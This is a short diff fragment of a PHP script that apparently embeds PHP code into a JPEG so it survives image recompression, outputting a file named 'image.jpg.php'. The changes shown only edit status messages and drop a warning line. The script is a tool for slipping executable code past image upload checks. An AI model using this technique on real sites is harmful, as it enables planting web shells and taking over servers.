@@ -32,7 +32,7 @@ do
     file_put_contents($orig, file_get_contents($url));
 } while(!tryInject($orig, $code, $quality));
  
-echo "[+] It seems like it worked!\n";
+echo "[+] Done\n";
 echo "[+] Result file: image.jpg.php\n";
  
 function tryInject($orig, $code, $quality)
@@ -69,7 +69,6 @@ function tryInject($orig, $code, $quality)
             sleep(1);
  
             file_put_contents($result_file, $tmpData);
-            echo "[!] Temp solution, if you get a 'recoverable parse error' here, it means it probably failed\n";
  
             sleep(1);
             $src = imagecreatefromjpeg($result_file);
